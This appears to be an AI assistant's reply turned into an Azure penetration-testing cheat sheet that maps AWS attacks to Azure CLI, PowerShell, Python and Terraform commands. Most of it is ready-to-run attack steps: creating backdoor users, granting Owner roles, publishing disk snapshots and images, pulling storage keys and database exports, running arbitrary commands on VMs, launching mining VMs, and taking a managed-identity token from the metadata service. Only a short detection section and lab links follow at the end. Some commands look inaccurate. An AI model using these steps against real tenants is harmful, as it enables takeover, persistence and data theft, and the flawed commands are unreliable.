# Download Azure VM Custom Data

Here's a rewritten, corrected, and summarized version of your AWS-based
actions, **adapted for Azure penetration testing**. Since Azure uses
different services and APIs (e.g., ARM, Azure CLI, PowerShell, REST
API), I’ve mapped the functionality as closely as possible using Azure
equivalents.

**Download Azure VM Custom Data (Equivalent to EC2 User Data)**

az vm show --name \<vm_name\> --resource-group \<rg_name\> --query
"osProfile.customData" -o tsv \| base64 -d

- Retrieves the base64-encoded custom data of a VM and decodes it.

- Use this to check for embedded credentials or scripts.

**Python (via Azure SDK):**

from azure.identity import DefaultAzureCredential

from azure.mgmt.compute import ComputeManagementClient

cred = DefaultAzureCredential()

client = ComputeManagementClient(cred, "\<subscription_id\>")

vm = client.virtual_machines.get("\<rg_name\>", "\<vm_name\>")

print(vm.os_profile.custom_data) \# Base64 decode manually if needed

**🧬 Launch Suspicious VMs (e.g., GPU-enabled for crypto mining)**

az vm create \\

--name attacker-vm \\

--resource-group \<rg_name\> \\

--image UbuntuLTS \\

--size Standard_NC6 \\

--generate-ssh-keys

- Standard_NC6 is a GPU-accelerated VM SKU in Azure.

- Could be used to launch costly or unauthorized workloads.

**Python:**

from azure.mgmt.compute.models import HardwareProfile

vm_params = {

"location": "eastus",

"hardware_profile": HardwareProfile(vm_size="Standard_NC6"),

...

}

client.virtual_machines.begin_create_or_update(\<rg\>, \<vm_name\>,
vm_params)

**📤 Execute Commands via Custom Data (Abuse Startup Scripts)**

az vm create \\

--name cmd-inject-vm \\

--resource-group \<rg_name\> \\

--custom-data "IyEvYmluL2Jhc2gKZWNobyAiTWFsaWNpb3VzIGNvbW1hbmQgaGVyZSIK"

- The --custom-data input is base64-encoded bash.

- Can be used to inject payloads or persistence.

**🔓 Open SSH Port (Port 22) on NSG**

az network nsg rule create \\

--resource-group \<rg_name\> \\

--nsg-name \<nsg_name\> \\

--name AllowSSH \\

--priority 1001 \\

--direction Inbound \\

--access Allow \\

--protocol Tcp \\

--destination-port-range 22 \\

--source-address-prefixes '\*' \\

--destination-address-prefixes '\*'

- Opens SSH for any IP – high alert in audits.

## **📦 Share and Exfiltrate Managed Images (AMI Equivalent)**

az image update --name \<image_name\> --resource-group \<rg_name\> \\

--set sharingProfile.permissions=Community

- Makes a managed image public or shareable across tenants.

- Alternative: share with specific tenant using --target-region.

## **💽 Share Azure Snapshots (EBS Equivalent)**

az snapshot update --name \<snapshot_name\> --resource-group \<rg_name\>
\\

--set access="Read" \\

--set sharingProfile.permissions=Community

- Makes a managed disk snapshot public.

- Can be copied to another subscription or tenant.

**🛠 Tools Like Pacu → Use AzureHound + PowerZure**

- AzureHound for graph-based permission mapping.

- PowerZure or Stormspotter for visibility and abuse of permissions.

- No direct terraform or Pacu equivalent in Azure but scripting via
  Azure CLI/PowerShell is highly flexible.

Would you like a ready-made script or Terraform equivalent for any of
these Azure attacks?

## **Exfiltrate Azure SQL Snapshot** 

Azure SQL doesn't allow direct snapshot sharing like RDS, but similar
objectives can be achieved by exporting and sharing .bacpac files.

**Export & Share Database:**

az sql db export \\

--admin-user \<admin_user\> \\

--admin-password \<admin_pass\> \\

--name \<db_name\> \\

--server \<server_name\> \\

--storage-key \<storage_account_key\> \\

--storage-key-type StorageAccessKey \\

--storage-uri
https://\<storage_account\>.blob.core.windows.net/\<container\>/\<db\>.bacpac
\\

--resource-group \<rg_name\>

**Abuse:**

- Place exported .bacpac in a **public or shared storage blob**.

- Enumerate public containers using tools like MicroBurst.

## **Backdoor Azure Blob Storage via Container Policy**

**Grant Public Read/List Access:**

az storage container set-permission \\

--account-name \<storage_account\> \\

--name \<container_name\> \\

--public-access container

- Enables anonymous blob enumeration and file downloads.

## **Azure Console Login Without MFA (If Conditional Access Not Enforced)**

**Abuse: Create Azure AD User via Graph or CLI**

az ad user create \\

--display-name "Backdoor User" \\

--user-principal-name attacker@\<domain\> \\

--password \<password\> \\

--force-change-password-next-login false

If MFA is not enforced via Conditional Access, this user may log in
freely.

**🛠️ Backdoor Azure Role Assignment (IAM Equivalent)**

**Replace Role Assignment to Grant Self Owner/Contributor**

az role assignment create \\

--assignee \<attacker_object_id\> \\

--role "Owner" \\

--scope "/subscriptions/\<sub_id\>/resourceGroups/\<rg_name\>"

- Used to maintain persistence or escalate privilege.

**🔑 Create Azure Access Key on Storage Account (No Direct IAM Keys)**

- Azure doesn't use IAM-style access keys. Instead, **Storage Account
  keys** or **SAS tokens** are used.

**Exfiltrate Storage Keys:**

az storage account keys list \\

--account-name \<storage_account\> \\

--resource-group \<rg_name\>

- Use these to access or share storage data outside the org.

**👤 Create Admin-Like Azure User**

**Create User and Assign High-Privilege Role:**

az ad user create \\

--display-name "admin-user" \\

--user-principal-name admin@\<domain\> \\

--password \<password\>

az role assignment create \\

--assignee admin@\<domain\> \\

--role "Owner" \\

--scope "/subscriptions/\<sub_id\>"

**🧬 Create Azure AD Login Profile (Mimic Login Profile Abuse)**

Azure AD users inherently have login profiles, so "login profile
creation" means ensuring a user has sign-in credentials and access.

**Reset Password:**

az ad user update \\

--id \<user_principal_name\> \\

--password \<new_password\>

**🎣 Backdoor Azure Function via Resource-Based Policy**

Azure Functions use **managed identities** and **RBAC** rather than
AWS-style resource-based policies.

**Grant Another Identity Access to Invoke:**

az role assignment create \\

--assignee \<attacker_spn_or_id\> \\

--role "Azure Functions Invoker" \\

--scope
"/subscriptions/\<sub_id\>/resourceGroups/\<rg\>/providers/Microsoft.Web/sites/\<function_app\>"

**🧬 Overwrite Azure Function Code**

**Update Code via ZIP Deployment:**

az functionapp deployment source config-zip \\

--src payload.zip \\

--name \<function_app_name\> \\

--resource-group \<rg_name\>

**⚓ Abuse Azure Arc (IAM Roles Anywhere Equivalent)**

Azure doesn't yet have a direct "IAM Roles Anywhere" equivalent, but
attackers can abuse **Azure Arc** to onboard non-Azure machines and link
them to the control plane:

**Register Malicious Arc Machine:**

az connectedmachine create \\

--name \<machine_name\> \\

--resource-group \<rg\> \\

--location \<region\> \\

--custom-location \<custom_loc\>

This can be used to **link external machines** to Azure and **abuse
policy, Defender, or Log Analytics integrations**.

## **Azure vm disk export**

**1. Execute Commands on Azure VMs**

**🔹 Using Custom Script Extension**

Executes scripts on a VM via Azure VM extensions.

az vm extension set \\

--resource-group \<resource-group-name\> \\

--vm-name \<vm-name\> \\

--name CustomScriptExtension \\

--publisher Microsoft.Compute \\

--settings '{"commandToExecute":"\<malicious-command\>"}' \\

--protected-settings '{"commandToExecute":"\<malicious-command\>"}'

**🔹 Using Azure Run Command**

Runs shell or PowerShell commands directly on the VM via the Azure
control plane.

**Linux VM**

az vm run-command invoke \\

--resource-group \<resource-group-name\> \\

--name \<vm-name\> \\

--command-id RunShellScript \\

--scripts "\<malicious-shell-command\>"

**Windows VM**

az vm run-command invoke \\

--resource-group \<resource-group-name\> \\

--name \<vm-name\> \\

--command-id RunPowerShellScript \\

--scripts "\<malicious-powershell-script\>"

**2. Export Azure VM Disks via SAS URL**

Enumerate and exfiltrate VM-managed disks using SAS token.

az disk grant-access \\

--resource-group \<resource-group-name\> \\

--name \<disk-name\> \\

--duration-in-seconds \<seconds\> \\

--access-level Read \\

--query 'accessSas' -o tsv

**PowerShell variant**:

\$disk = Get-AzDisk -ResourceGroupName "\<resource-group-name\>"
-DiskName "\<disk-name\>"

\$sasToken = Grant-AzDiskAccess -DiskId \$disk.Id -AccessLevel Read
-DurationInSecond \<duration\>

\$diskUrl = \$disk.DiskUri + \$sasToken.AccessSAS

\$diskUrl

**3. Privilege Escalation via Key Vault Access**

Misconfigured Key Vault access policies can allow privilege escalation.

az keyvault set-policy \\

--name \<key-vault-name\> \\

--object-id \<principal-object-id\> \\

--secret-permissions get \\

--key-permissions wrapkey

**4. Metadata Service Exploitation (SSRF)**

Abuse Azure Instance Metadata Service (IMDS) to extract credentials.

curl -H "Metadata:true"
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com"

**5. Terraform Support (for automation)**

Many of the above actions can be translated into Terraform modules:

resource "azurerm_virtual_machine_extension" "malicious_script" {

name = "CustomScriptExtension"

virtual_machine_id = azurerm_virtual_machine.vm.id

publisher = "Microsoft.Compute"

type = "CustomScriptExtension"

type_handler_version = "1.9"

settings = jsonencode({

commandToExecute = var.command_to_execute

})

protected_settings = jsonencode({

commandToExecute = var.command_to_execute

})

}

**🛡️ Defense & Detection**

- **Monitoring**: Use Azure Defender and Log Analytics for:

  - RunCommand invocations

  - Disk access grants

  - KeyVault policy changes

  - Extension deployments

- **Detection Rules**:

  - Monitor Microsoft.Compute/virtualMachines/extensions/write

  - Watch Microsoft.Compute/virtualMachines/runCommand/action

  - Alert on Microsoft.KeyVault/vaults/accessPolicies/write

**🧪 Labs & Simulation**

- [Stratus Red Team
  (Azure)](https://github.com/Datadog/stratus-red-team/)

- [FalconFriday Azure
  Scenarios](https://github.com/FalconForceTeam/FalconFriday)

- [Azure Threat
  Simulation](https://github.com/sbasu7241/AWS-Threat-Simulation-andDetection/tree/main#azure)

Would you like this exported into a structured Markdown playbook file?
